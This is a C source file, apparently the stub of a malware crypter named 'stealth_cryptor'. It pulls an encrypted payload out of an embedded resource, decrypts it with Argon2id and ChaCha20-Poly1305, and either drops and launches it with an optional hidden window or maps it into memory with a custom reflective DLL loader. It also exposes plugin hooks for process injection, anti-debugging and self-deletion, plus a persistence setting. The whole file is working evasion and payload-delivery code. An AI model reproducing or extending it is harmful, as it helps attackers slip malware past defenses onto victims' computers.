#
// NOTE (build/system):
// Historically, the generated output opened a console window when launched from
// the GUI. Root cause: the `stub` binary was built as a console subsystem,
// which forces the OS to create a console for the process. To avoid the console
// popup when the GUI launches a generated executable, build `stub` as a GUI
// subsystem program (no console) using:
//
//   gcc -mwindows -o stub.exe stub.c ...
//
// Also when building for development/debugging, build the packer
// (`stealth_cryptor`) with
// `-DALLOW_CONSOLE_PRINTS` so it writes to stdout/stderr (the GUI captures and
// displays this output). For file-based diagnostic logs the stub and plugin
// loader should be built with `-DENABLE_FILE_LOGS` so they write to
// `%TEMP%\stealth_debug.log` and
// `%TEMP%\stealth_plugin_loader.log` which the GUI reads.
//
// Summary of recommended build flags:
// - Packager (console output):   -DALLOW_CONSOLE_PRINTS
// - Stub (no console window):    -mwindows -DENABLE_FILE_LOGS
// These flags are intentionally separate so developers can still run the packer
// from a terminal during testing while the shipped stub remains a windowless
// GUI-subsystem binary.
#include "crypto.h"
#include "plugin.h"
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <windows.h>
// Prototype for plugin loader (implemented in plugin_loader.c)
int plugin_loader_init(const char *key_hex);
int plugin_fire_stage(int stage);

#ifndef PATH_BUF_LEN
#define PATH_BUF_LEN 4096
#endif

HMODULE g_hDll = NULL;
// Module handle for the stub itself (set by template.c when loaded in-memory)
HMODULE g_hStubModule = NULL;
// Named event handle to allow cooperative shutdown (can be signaled externally)
HANDLE g_exit_event = NULL;

// ============================================================================
// PAYLOAD ACCESS API - Global state for injector plugins
// ============================================================================
static StealthPayload g_payload = {0};
static BOOL g_injection_handled = FALSE;

// Get the current payload - called by injector plugins
__declspec(dllexport) StealthPayload *stealth_get_payload(void) {
  if (g_payload.data == NULL || g_payload.size == 0) {
    return NULL;
  }
  return &g_payload;
}

// Signal that injection was handled by a plugin
__declspec(dllexport) void stealth_set_injection_handled(void) {
  g_injection_handled = TRUE;
  // Also set environment variable so template.dll knows to skip
  SetEnvironmentVariableA("STEALTH_INJECTION_HANDLED", "1");
}

// Check if injection was already handled
__declspec(dllexport) BOOL stealth_is_injection_handled(void) {
  return g_injection_handled;
}

// Internal: Set payload data (called by stub before firing PREINJECT)
static void set_payload_data(void *data, size_t size, BOOL in_memory) {
  g_payload.data = data;
  g_payload.size = size;
  g_payload.in_memory_mode = in_memory;
  // Check if it's a PE file
  if (size >= 2 && ((unsigned char *)data)[0] == 'M' &&
      ((unsigned char *)data)[1] == 'Z') {
    g_payload.is_pe = TRUE;
  } else {
    g_payload.is_pe = FALSE;
  }
}
// ============================================================================

static void secure_zero(void *ptr, size_t len) {
  if (ptr && len) {
    SecureZeroMemory(ptr, len);
  }
}

// Simple debug appender to %TEMP%\stealth_debug.log (no-op unless
// ENABLE_FILE_LOGS defined)
#ifdef ENABLE_FILE_LOGS
static void write_debug(const char *msg) {
#ifndef PATH_BUF_LEN
#define PATH_BUF_LEN 4096
#endif
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"
  char tmp[PATH_BUF_LEN];
  if (!GetTempPathA(PATH_BUF_LEN, tmp))
    return;
  char path[PATH_BUF_LEN];
  snprintf(path, PATH_BUF_LEN, "%sstealth_debug.log", tmp);
  HANDLE hf = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                          OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hf == INVALID_HANDLE_VALUE)
    return;
  DWORD written = 0;
  WriteFile(hf, msg, (DWORD)strlen(msg), &written, NULL);
  WriteFile(hf, "\n", 1, &written, NULL);
  CloseHandle(hf);
}
#else
static void write_debug(const char *msg) { (void)msg; }
#endif

void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {
  for (size_t i = 0; i < len; i++) {
    char tmp[3] = {0};
    tmp[0] = hex[2 * i];
    tmp[1] = hex[2 * i + 1];
    unsigned int v = (unsigned int)strtoul(tmp, NULL, 16);
    bytes[i] = (unsigned char)(v & 0xFF);
  }
}

HMODULE LoadDllInMemory(void *dll_data, DWORD dll_size) {
  if (!dll_data || dll_size < sizeof(IMAGE_DOS_HEADER)) {
    return NULL;
  }

  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dll_data;
  if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
    return NULL;
  }

  if (dosHeader->e_lfanew >= dll_size) {
    return NULL;
  }

  PIMAGE_NT_HEADERS ntHeader =
      (PIMAGE_NT_HEADERS)((BYTE *)dll_data + dosHeader->e_lfanew);
  if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
    return NULL;
  }

  LPVOID imageBase =
      VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage,
                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (!imageBase) {
    return NULL;
  }

  memcpy((BYTE *)imageBase, dll_data, ntHeader->OptionalHeader.SizeOfHeaders);
  PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader);
  for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
    if (section[i].SizeOfRawData &&
        section[i].PointerToRawData + section[i].SizeOfRawData <= dll_size) {
      memcpy((BYTE *)imageBase + section[i].VirtualAddress,
             (BYTE *)dll_data + section[i].PointerToRawData,
             section[i].SizeOfRawData);
    } else if (section[i].SizeOfRawData) {
      VirtualFree(imageBase, 0, MEM_RELEASE);
      return NULL;
    }
  }

  PIMAGE_IMPORT_DESCRIPTOR importDesc =
      (PIMAGE_IMPORT_DESCRIPTOR)((BYTE *)imageBase +
                                 ntHeader->OptionalHeader
                                     .DataDirectory
                                         [IMAGE_DIRECTORY_ENTRY_IMPORT]
                                     .VirtualAddress);
  if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
          .Size &&
      (BYTE *)importDesc <
          (BYTE *)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
    while (importDesc->Name) {
      LPCSTR dllName = (LPCSTR)((BYTE *)imageBase + importDesc->Name);
      if ((BYTE *)dllName >=
          (BYTE *)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
        VirtualFree(imageBase, 0, MEM_RELEASE);
        return NULL;
      }
      HMODULE hDll = LoadLibraryA(dllName);
      if (!hDll) {
        VirtualFree(imageBase, 0, MEM_RELEASE);
        return NULL;
      }
      PIMAGE_THUNK_DATA thunk =
          (PIMAGE_THUNK_DATA)((BYTE *)imageBase + importDesc->FirstThunk);
      while (thunk->u1.AddressOfData) {
        if ((BYTE *)thunk >=
            (BYTE *)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
          VirtualFree(imageBase, 0, MEM_RELEASE);
          return NULL;
        }
        if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
          thunk->u1.Function = (ULONGLONG)GetProcAddress(
              hDll, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
          if (!thunk->u1.Function) {
            VirtualFree(imageBase, 0, MEM_RELEASE);
            return NULL;
          }
        } else {
          PIMAGE_IMPORT_BY_NAME importByName =
              (PIMAGE_IMPORT_BY_NAME)((BYTE *)imageBase +
                                      thunk->u1.AddressOfData);
          if ((BYTE *)importByName >=
              (BYTE *)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
            VirtualFree(imageBase, 0, MEM_RELEASE);
            return NULL;
          }
          thunk->u1.Function =
              (ULONGLONG)GetProcAddress(hDll, importByName->Name);
          if (!thunk->u1.Function) {
            VirtualFree(imageBase, 0, MEM_RELEASE);
            return NULL;
          }
        }
        thunk++;
      }
      importDesc++;
    }
  }

  DWORD64 delta = (DWORD64)imageBase - ntHeader->OptionalHeader.ImageBase;
  if (delta != 0 &&
      ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
          .Size) {
    PIMAGE_BASE_RELOCATION relocation =
        (PIMAGE_BASE_RELOCATION)((BYTE *)imageBase +
                                 ntHeader->OptionalHeader
                                     .DataDirectory
                                         [IMAGE_DIRECTORY_ENTRY_BASERELOC]
                                     .VirtualAddress);
    if ((BYTE *)relocation >=
        (BYTE *)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
      VirtualFree(imageBase, 0, MEM_RELEASE);
      return NULL;
    }
    while (relocation->VirtualAddress) {
      if ((BYTE *)relocation >=
          (BYTE *)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
        VirtualFree(imageBase, 0, MEM_RELEASE);
        return NULL;
      }
      DWORD numRelocs =
          (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
          sizeof(WORD);
      WORD *relocData = (WORD *)(relocation + 1);
      for (DWORD i = 0; i < numRelocs; i++) {
        if ((BYTE *)&relocData[i] >=
            (BYTE *)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
          VirtualFree(imageBase, 0, MEM_RELEASE);
          return NULL;
        }
        int type = relocData[i] >> 12;
        int offset = relocData[i] & 0xFFF;
        if (type == IMAGE_REL_BASED_DIR64) {
          DWORD64 *address = (DWORD64 *)((BYTE *)imageBase +
                                         relocation->VirtualAddress + offset);
          if ((BYTE *)address >=
              (BYTE *)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
            VirtualFree(imageBase, 0, MEM_RELEASE);
            return NULL;
          }
          *address += delta;
        }
      }
      relocation = (PIMAGE_BASE_RELOCATION)((BYTE *)relocation +
                                            relocation->SizeOfBlock);
    }
  }

  typedef BOOL(WINAPI * DllMain_t)(HMODULE, DWORD, LPVOID);
  DllMain_t dllMain = (DllMain_t)((BYTE *)imageBase +
                                  ntHeader->OptionalHeader.AddressOfEntryPoint);
  if ((BYTE *)dllMain < (BYTE *)imageBase ||
      (BYTE *)dllMain >=
          (BYTE *)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
    VirtualFree(imageBase, 0, MEM_RELEASE);
    return NULL;
  }
  // Apply per-section protections after relocations/import resolution
  DWORD oldProt = 0;
  // Protect headers as read-only
  VirtualProtect(imageBase, ntHeader->OptionalHeader.SizeOfHeaders,
                 PAGE_READONLY, &oldProt);
  section = IMAGE_FIRST_SECTION(ntHeader);
  for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
    SIZE_T raw_size = section[i].SizeOfRawData;
    SIZE_T virt_size = section[i].Misc.VirtualSize;
    SIZE_T size_to_protect = virt_size ? virt_size : raw_size;
    if (size_to_protect == 0)
      continue;
    DWORD characteristics = section[i].Characteristics;
    DWORD protect = PAGE_NOACCESS;
    int is_exec = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    int is_write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;
    int is_read = (characteristics & IMAGE_SCN_MEM_READ) != 0;
    if (is_exec && is_write)
      protect = PAGE_EXECUTE_READWRITE;
    else if (is_exec && is_read)
      protect = PAGE_EXECUTE_READ;
    else if (is_exec)
      protect = PAGE_EXECUTE;
    else if (is_write)
      protect = PAGE_READWRITE;
    else if (is_read)
      protect = PAGE_READONLY;
    else
      protect = PAGE_NOACCESS;
    LPVOID sec_addr = (BYTE *)imageBase + section[i].VirtualAddress;
    if (!VirtualProtect(sec_addr, size_to_protect, protect, &oldProt)) {
      VirtualFree(imageBase, 0, MEM_RELEASE);
      return NULL;
    }
  }

  if (!dllMain((HMODULE)imageBase, DLL_PROCESS_ATTACH, NULL)) {
    VirtualFree(imageBase, 0, MEM_RELEASE);
    return NULL;
  }

  return (HMODULE)imageBase;
}

int main(int argc, char *argv[]) {
  // Ensure we always record a startup trace for diagnostics
  write_debug("stub started");
  HRSRC hConfigRes = NULL;
  HGLOBAL hData;
  void *lpData = NULL;
  DWORD bytesRead = 0;
  HMODULE hDllModule = NULL;
  int ret = 1;
  HANDLE hFile = INVALID_HANDLE_VALUE;
  PROCESS_INFORMATION pi;
  ZeroMemory(&pi, sizeof(pi));
  unsigned char *decrypted_payload = NULL;

  // Use g_hStubModule if set (in-memory mode), otherwise get from process
  HMODULE hModule = g_hStubModule ? g_hStubModule : GetModuleHandle(NULL);
  char dbg_mod[128];
  snprintf(dbg_mod, sizeof(dbg_mod),
           "hModule=%p g_hStubModule=%p GetModuleHandle(NULL)=%p",
           (void *)hModule, (void *)g_hStubModule,
           (void *)GetModuleHandle(NULL));
  write_debug(dbg_mod);
  hConfigRes = FindResource(hModule, "CONFIG", "PAYLOAD");
  if (hConfigRes) {
    hData = LoadResource(hModule, hConfigRes);
    if (!hData) {
      ret = 1;
      goto cleanup;
    }
    lpData = LockResource(hData);
    if (!lpData) {
      ret = 1;
      goto cleanup;
    }
    bytesRead = SizeofResource(hModule, hConfigRes);
    if (bytesRead == 0) {
      ret = 1;
      goto cleanup;
    }
  } else {
    HRSRC hDllRes = FindResource(hModule, "DLL", "PAYLOAD");
    if (!hDllRes) {
      return 1;
    }
    HGLOBAL hDllGlobal = LoadResource(hModule, hDllRes);
    if (!hDllGlobal) {
      ret = 1;
      goto cleanup;
    }
    void *dll_data = LockResource(hDllGlobal);
    if (!dll_data) {
      ret = 1;
      goto cleanup;
    }
    DWORD dll_size = SizeofResource(hModule, hDllRes);
    if (dll_size == 0) {
      ret = 1;
      goto cleanup;
    }

    hDllModule = LoadDllInMemory(dll_data, dll_size);
    if (!hDllModule) {
      ret = 1;
      goto cleanup;
    }

    hConfigRes = FindResource(hDllModule, "CONFIG", "PAYLOAD");
    if (!hConfigRes) {
      ret = 1;
      goto cleanup;
    }
    hData = LoadResource(hDllModule, hConfigRes);
    if (!hData) {
      ret = 1;
      goto cleanup;
    }
    lpData = LockResource(hData);
    if (!lpData) {
      ret = 1;
      goto cleanup;
    }
    bytesRead = SizeofResource(hDllModule, hConfigRes);
    if (bytesRead == 0) {
      ret = 1;
      goto cleanup;
    }
  }

  typedef struct {
    char magic[4];
    uint16_t version;
    uint16_t reserved;
  } PayloadHeader;
  typedef struct {
    char key_hex[65];
    unsigned char persistence;
    unsigned int junk_url_count;
    unsigned long long payload_size;
    unsigned char load_in_memory;
    char inject_target[260];
    unsigned char payload_data[1];
  } PayloadConfig;
  if (bytesRead <
      sizeof(PayloadHeader) + offsetof(PayloadConfig, payload_data)) {
    write_debug("config header too small");
    ret = 1;
    goto cleanup;
  }
  PayloadHeader *hdr = (PayloadHeader *)lpData;
  {
    char dbg_hdr[128];
    snprintf(
        dbg_hdr, sizeof(dbg_hdr),
        "CONFIG header: magic=%02X %02X %02X %02X version=%u bytesRead=%lu",
        (unsigned char)hdr->magic[0], (unsigned char)hdr->magic[1],
        (unsigned char)hdr->magic[2], (unsigned char)hdr->magic[3],
        (unsigned)hdr->version, (unsigned long)bytesRead);
    write_debug(dbg_hdr);
  }
  if (memcmp(hdr->magic, "STCF", 4) != 0 || hdr->version != 1) {
    write_debug("config header invalid magic/version");
    ret = 1;
    goto cleanup;
  }
  PayloadConfig *config =
      (PayloadConfig *)((unsigned char *)lpData + sizeof(PayloadHeader));
  // Log config summary for diagnostics
  {
    char dbg[256];
    snprintf(dbg, sizeof(dbg), "CONFIG: load_in_memory=%u, payload_size=%llu",
             (unsigned)config->load_in_memory,
             (unsigned long long)config->payload_size);
    write_debug(dbg);
  }

  int load_in_memory = (config->load_in_memory == 1);

  // Set inject target env var from config so injector plugins can read it
  if (config->inject_target[0]) {
    SetEnvironmentVariableA("STEALTH_INJECT_TARGET", config->inject_target);
  }

  unsigned long long payload_size = config->payload_size;
  unsigned char *encrypted_payload = config->payload_data;
  size_t stored_len =
      bytesRead - sizeof(PayloadHeader) - offsetof(PayloadConfig, payload_data);
  if (payload_size > stored_len) {
    write_debug("config payload_size exceeds stored length");
    ret = 1;
    goto cleanup;
  }

  // Attempt to load any appended plugins (packer may have appended an encrypted
  // overlay). Pass the same key used for payload encryption so plugin blobs can
  // be decrypted.
  plugin_loader_init(config->key_hex);
  // Register exit handler to fire ONEXIT plugins at process termination
  void on_exit_handler(void) { plugin_fire_stage(PLUGIN_STAGE_ONEXIT); }
  atexit(on_exit_handler);

  // Fire PRELAUNCH stage first - for protection plugins (melt, antidebug)
  // These run before any payload handling
  plugin_fire_stage(PLUGIN_STAGE_PRELAUNCH);

  // Now we need to decrypt the payload BEFORE firing PREINJECT
  // so that injector plugins can access the decrypted data

  if (!load_in_memory) {
    {
      char dbg[128];
      snprintf(dbg, sizeof(dbg), "disk-mode stored_len=%zu bytesRead=%lu",
               stored_len, (unsigned long)bytesRead);
      write_debug(dbg);
    }
    if (stored_len < sizeof(CryptoEnvelope)) {
      write_debug("stored_len too small for envelope");
      ret = 1;
      goto cleanup;
    }
    CryptoEnvelope env;
    memcpy(&env, encrypted_payload, sizeof(env));
    if (env.version != CRYPTO_VERSION) {
      write_debug("config crypto version mismatch");
      ret = 1;
      goto cleanup;
    }
    size_t ciphertext_len = stored_len - sizeof(CryptoEnvelope);
    if (ciphertext_len != (size_t)payload_size ||
        env.ciphertext_len != (size_t)payload_size) {
      write_debug("ciphertext length mismatch");
      ret = 1;
      goto cleanup;
    }
    const uint8_t *ciphertext = encrypted_payload + sizeof(CryptoEnvelope);
    CryptoEnvelope env_use = env;
    env_use.ciphertext = ciphertext;
    env_use.ciphertext_len = ciphertext_len;
    decrypted_payload = malloc(ciphertext_len);
    if (!decrypted_payload) {
      write_debug("malloc decrypted_payload failed");
      ret = 1;
      goto cleanup;
    }
    uint8_t key[CRYPTO_KEY_LEN];
    if (crypto_argon2id_derive(
            (const uint8_t *)config->key_hex, strlen(config->key_hex),
            env_use.salt, CRYPTO_SALT_LEN, env_use.t_cost, env_use.m_cost_kib,
            env_use.parallelism, key, sizeof(key)) != 0) {
      write_debug("argon2id derive failed");
      secure_zero(key, sizeof(key));
      ret = 1;
      goto cleanup;
    }
    if (crypto_chacha20_poly1305_decrypt(ciphertext, ciphertext_len, key, NULL,
                                         0, &env_use, decrypted_payload) != 0) {
      write_debug("chacha20 decrypt failed");
      secure_zero(key, sizeof(key));
      ret = 1;
      goto cleanup;
    }
    secure_zero(key, sizeof(key));

    // Payload is now decrypted - make it available to injector plugins
    set_payload_data(decrypted_payload, ciphertext_len, FALSE);

    // Fire PREINJECT stage - injector plugins can now access the payload
    plugin_fire_stage(PLUGIN_STAGE_PREINJECT);

    // Check if an injector plugin handled the injection
    if (stealth_is_injection_handled()) {
      write_debug("Injection handled by plugin - skipping default execution");
      plugin_fire_stage(PLUGIN_STAGE_POSTLAUNCH);
      free(decrypted_payload);
      decrypted_payload = NULL;
      if (hDllModule)
        VirtualFree(hDllModule, 0, MEM_RELEASE);
      ret = 0;
      goto cleanup;
    }

    char bin_path[PATH_BUF_LEN];
    GetModuleFileNameA(NULL, bin_path, PATH_BUF_LEN);
    // Build an absolute decrypted path next to the stub to avoid CWD surprises
    char decrypted_path[PATH_BUF_LEN];
    char *last_sep = strrchr(bin_path, '\\');
    if (last_sep) {
      size_t dir_len = (size_t)(last_sep - bin_path);
      if (dir_len >= PATH_BUF_LEN - 1)
        dir_len = PATH_BUF_LEN - 2;
      memcpy(decrypted_path, bin_path, dir_len);
      decrypted_path[dir_len] = '\\';
      decrypted_path[dir_len + 1] = '\0';
      const char *bin_name = last_sep + 1;
      char suffix[PATH_BUF_LEN];
      snprintf(suffix, sizeof(suffix), "decrypted_%s", bin_name);
      strncat(decrypted_path, suffix,
              PATH_BUF_LEN - strlen(decrypted_path) - 1);
    } else {
      snprintf(decrypted_path, PATH_BUF_LEN, "decrypted_%s", bin_path);
    }
    HANDLE hFile = CreateFileA(decrypted_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
      char dbg2[256];
      snprintf(dbg2, sizeof(dbg2), "CreateFile failed for %s err=%lu",
               decrypted_path, GetLastError());
      write_debug(dbg2);
      ret = 1;
      goto cleanup;
    }
    DWORD bytesWritten;
    if (!WriteFile(hFile, decrypted_payload, (DWORD)payload_size, &bytesWritten,
                   NULL)) {
      ret = 1;
      goto cleanup;
    }
    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    // Visibility policy:
    // - Default: show the payload window (to surface UI payloads like message
    // boxes).
    // - Set STEALTH_HIDE_PAYLOAD=1 to keep it hidden.
    // - STEALTH_SHOW_PAYLOAD=1 also forces shown (back-compat flag from
    // earlier).
    const char *show_env = getenv("STEALTH_SHOW_PAYLOAD");
    const char *hide_env = getenv("STEALTH_HIDE_PAYLOAD");
    int force_show = (show_env && show_env[0] == '1');
    int force_hide = (hide_env && hide_env[0] == '1');
    if (force_hide) {
      si.dwFlags = STARTF_USESHOWWINDOW;
      si.wShowWindow = SW_HIDE;
    } else {
      si.dwFlags = STARTF_USESHOWWINDOW;
      si.wShowWindow = SW_SHOWNORMAL;
    }
    // Debug log: attempt CreateProcess (absolute path)
    char dbgmsg[1024];
    snprintf(dbgmsg, sizeof(dbgmsg), "Attempting CreateProcess: %s",
             decrypted_path);
    write_debug(dbgmsg);
    // Fire PRELAUNCH again just before launching (in case plugins were staged
    // earlier)
    plugin_fire_stage(PLUGIN_STAGE_PRELAUNCH);
    DWORD creationFlags = 0;
    if (force_hide)
      creationFlags = CREATE_NO_WINDOW;
    // Set current-directory for child to the stub directory (so relative
    // resources work)
    char child_cwd[PATH_BUF_LEN];
    strncpy(child_cwd, bin_path, PATH_BUF_LEN);
    char *cwd_sep = strrchr(child_cwd, '\\');
    if (cwd_sep)
      *cwd_sep = '\0';

    if (!CreateProcessA(decrypted_path, NULL, NULL, NULL, FALSE, creationFlags,
                        NULL, child_cwd, &si, &pi)) {
      snprintf(dbgmsg, sizeof(dbgmsg), "CreateProcess failed: %lu",
               GetLastError());
      write_debug(dbgmsg);
      // Signal plugins about failure
      plugin_fire_stage(PLUGIN_STAGE_ONFAIL);
      // keep the decrypted file for inspection
      // DeleteFileA(decrypted_path);
      ret = 1;
      goto cleanup;
    }
    snprintf(dbgmsg, sizeof(dbgmsg), "CreateProcess succeeded, pid=%lu",
             (unsigned long)pi.dwProcessId);
    write_debug(dbgmsg);
    // Fire POSTLAUNCH plugins after successful launch
    plugin_fire_stage(PLUGIN_STAGE_POSTLAUNCH);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    free(decrypted_payload);
    decrypted_payload = NULL;
    // Keep the decrypted file for inspection during debugging.
    // DeleteFileA(decrypted_path);
    if (hDllModule)
      VirtualFree(hDllModule, 0, MEM_RELEASE);
    ret = 0;
    goto cleanup;
  }

  // ============================================================================
  // IN-MEMORY MODE: Decrypt payload and fire PREINJECT for injector plugins
  // ============================================================================
  write_debug(">>> IN-MEMORY PREINJECT BLOCK REACHED <<<");
  write_debug("in-memory mode - decrypting for injector plugins");

  // Decrypt payload so injectors can access it
  if (stored_len >= sizeof(CryptoEnvelope)) {
    CryptoEnvelope env;
    memcpy(&env, encrypted_payload, sizeof(env));
    if (env.version == CRYPTO_VERSION) {
      size_t ciphertext_len = stored_len - sizeof(CryptoEnvelope);
      if (ciphertext_len == env.ciphertext_len &&
          ciphertext_len == (size_t)payload_size) {
        const uint8_t *ciphertext = encrypted_payload + sizeof(CryptoEnvelope);
        CryptoEnvelope env_use = env;
        env_use.ciphertext = ciphertext;
        env_use.ciphertext_len = ciphertext_len;

        decrypted_payload = malloc(ciphertext_len);
        if (decrypted_payload) {
          uint8_t key[CRYPTO_KEY_LEN];
          if (crypto_argon2id_derive((const uint8_t *)config->key_hex,
                                     strlen(config->key_hex), env_use.salt,
                                     CRYPTO_SALT_LEN, env_use.t_cost,
                                     env_use.m_cost_kib, env_use.parallelism,
                                     key, sizeof(key)) == 0) {
            if (crypto_chacha20_poly1305_decrypt(ciphertext, ciphertext_len,
                                                 key, NULL, 0, &env_use,
                                                 decrypted_payload) == 0) {
              write_debug("Payload decrypted for injectors");

              // Make payload available to injector plugins
              set_payload_data(decrypted_payload, ciphertext_len, TRUE);

              // Fire PREINJECT - injector plugins can now access the payload
              plugin_fire_stage(PLUGIN_STAGE_PREINJECT);

              // Check if an injector plugin handled the execution
              if (stealth_is_injection_handled()) {
                write_debug("Injection handled by plugin - skipping template "
                            "execution");
                plugin_fire_stage(PLUGIN_STAGE_POSTLAUNCH);
                secure_zero(key, sizeof(key));
                free(decrypted_payload);
                decrypted_payload = NULL;
                if (hDllModule)
                  VirtualFree(hDllModule, 0, MEM_RELEASE);
                ret = 0;
                goto cleanup;
              }
            }
          }
          secure_zero(key, sizeof(key));
          free(decrypted_payload);
          decrypted_payload = NULL;
        }
      }
    }
  }

  // Create and signal the proceed event for template.dll
  // Template thread is waiting for this signal before executing
  HANDLE hProceedEvent =
      CreateEventA(NULL, TRUE, FALSE, "Local\\STEALTH_TEMPLATE_PROCEED");
  if (hProceedEvent) {
    write_debug("Signaling template to proceed");
    SetEvent(hProceedEvent);
    // Keep handle open - template will open its own handle
  }

  write_debug("Template will handle execution");
  // ============================================================================

  g_hDll = hDllModule;

  // For in-memory mode, fire POSTLAUNCH after we've mapped the DLL into memory.
  plugin_fire_stage(PLUGIN_STAGE_POSTLAUNCH);

  // Main loop — keep host resident
  // Create a named event so external controllers or tests can signal graceful
  // shutdown
  g_exit_event = CreateEventA(NULL, TRUE, FALSE, "Global\\STEALTH_EXIT_EVENT");
  if (g_exit_event) {
    // Wait until the event is signaled
    WaitForSingleObject(g_exit_event, INFINITE);
  } else {
    // Fallback to original behavior if event creation fails
    while (TRUE) {
      Sleep(1000);
    }
  }
  // On exit, signal ONEXIT (unreachable in normal flow)
  plugin_fire_stage(PLUGIN_STAGE_ONEXIT);
  ret = 0;

cleanup:
  if (hFile != INVALID_HANDLE_VALUE)
    CloseHandle(hFile);
  if (decrypted_payload) {
    SecureZeroMemory(decrypted_payload, payload_size);
    free(decrypted_payload);
  }
  if (hDllModule)
    VirtualFree(hDllModule, 0, MEM_RELEASE);
  if (g_exit_event) {
    CloseHandle(g_exit_event);
    g_exit_event = NULL;
  }
  return ret;
}

#pragma GCC diagnostic pop